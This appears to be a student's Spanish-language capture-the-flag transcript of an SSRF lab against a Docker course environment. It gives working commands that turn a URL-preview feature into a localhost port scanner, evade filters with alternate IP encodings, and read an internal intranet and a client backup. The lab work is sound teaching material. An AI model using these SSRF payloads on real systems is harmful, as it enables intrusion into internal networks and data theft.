@@ -1,0 +1,101 @@
+Transcript — Lab Extra SSRF (grupo08)
+Corrida real contra el entorno Docker de la catedra. Todos los comandos desde la
+consola atacante (cyberlab-attacker) en labnet. Equivale a `make lab N=extra` + `make shell`.
+
+Entorno levantado con:
+  docker compose -p cyberlab --project-directory . \
+    -f entorno/docker-compose.yml \
+    -f labs/labextra-ssrf/entorno/target.compose.yml up -d --build
+
+================================================================================
+PUNTO DE PARTIDA — la intranet NO es alcanzable directo desde labnet
+================================================================================
+$ docker exec cyberlab-attacker curl -s --max-time 3 phantomcorp-intra/ ; echo "exit=$?"
+exit=6                      # (6 = couldn't resolve host / no hay ruta desde labnet)
+
+Funcionalidad vulnerable — el portal publico fetchea URLs que le pasan:
+$ docker exec cyberlab-attacker curl -s phantomcorp/ | grep -A2 preview
+<form action="/preview" method="get">
+  <label>Previsualizar URL:&nbsp;
+    <input name="url" size="48" placeholder="https://ejemplo.com"></label>
+
+================================================================================
+R1 — Panel interno en localhost  (el /preview como oraculo de puertos)
+================================================================================
+# Puerto ABIERTO -> devuelve el contenido fetcheado
+$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://127.0.0.1:80/"
+<h3>Previsualizacion de http://127.0.0.1:80/</h3><hr><!doctype html>...PhantomCorp — Portal...
+
+# Puerto CERRADO -> mensaje de error distinguible (oraculo)
+$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://127.0.0.1:9999/"
+No pude traer http://127.0.0.1:9999/: <urlopen error [Errno 111] Connection refused>
+
+# Barrido de puertos admin sobre 127.0.0.1
+$ for p in 8080 8000 5000 3000 9090 9000 8888 8081 8443 1337 ; do
+    r=$(docker exec cyberlab-attacker curl -s --max-time 4 "phantomcorp/preview?url=http://127.0.0.1:$p/")
+    echo "$r" | grep -q "Connection refused" && echo "$p cerrado" || echo "$p ABIERTO <<<"
+  done
+8080 cerrado
+8000 cerrado
+5000 cerrado
+3000 cerrado
+9090 cerrado
+9000 ABIERTO <<<
+8888 cerrado
+8081 cerrado
+8443 cerrado
+1337 cerrado
+
+# Lectura del panel interno (puerto 9000)
+$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://127.0.0.1:9000/"
+<h2>PhantomCorp — Panel interno (solo localhost)</h2>
+<p>Si estás viendo esto desde afuera, algo salió mal.</p>
+<p>Deploy key: <b>FLAG{ssrf_localhost_panel_interno}</b></p>
+
+# El filtrado de strings no alcanza: 127.0.0.1 en decimal y forma corta dan igual
+$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://2130706433:9000/" | grep -o 'FLAG{[^}]*}'
+FLAG{ssrf_localhost_panel_interno}
+$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://127.1:9000/" | grep -o 'FLAG{[^}]*}'
+FLAG{ssrf_localhost_panel_interno}
+
+>> Flag R1: FLAG{ssrf_localhost_panel_interno}
+
+================================================================================
+R2 — Intranet en la red interna
+================================================================================
+$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://phantomcorp-intra/"
+<h1>Intranet PhantomCorp</h1>
+<p><b>USO INTERNO.</b> Si la estás viendo desde afuera, avisá a Seguridad.</p>
+<p>Host: <b>FLAG{ssrf_intranet_descubierta}</b></p>
+<ul>
+  <li><a href="/backups/clientes.json">backup de clientes (temporal, borrar!)</a></li>
+  <li><a href="/salud">estado del servicio</a></li>
+</ul>
+
+>> Flag R2: FLAG{ssrf_intranet_descubierta}
+
+================================================================================
+R3 — Exfiltracion del backup
+================================================================================
+$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json"
+{
+  "_aviso": "backup temporal pre-migracion. NO deberia ser accesible.",
+  "clientes": [
+    {"id": 1, "empresa": "Aconcagua SRL", "cuit": "30-70998877-1"},
+    {"id": 2, "empresa": "Comechingones SA", "cuit": "30-71554433-6"}
+  ],
+  "integridad": "FLAG{ssrf_backup_clientes}"
+}
+
+Datos sensibles exfiltrados: razon social y CUIT de dos clientes.
+
+>> Flag R3: FLAG{ssrf_backup_clientes}
+
+================================================================================
+ENTREGA DE FLAGS
+================================================================================
+$ ./ctf submit extra R1 'FLAG{ssrf_localhost_panel_interno}'
+$ ./ctf submit extra R2 'FLAG{ssrf_intranet_descubierta}'
+$ ./ctf submit extra R3 'FLAG{ssrf_backup_clientes}'
+$ ./ctf status extra
+  -> 3/3 (100%)   (ver ctf-status-extra.txt)
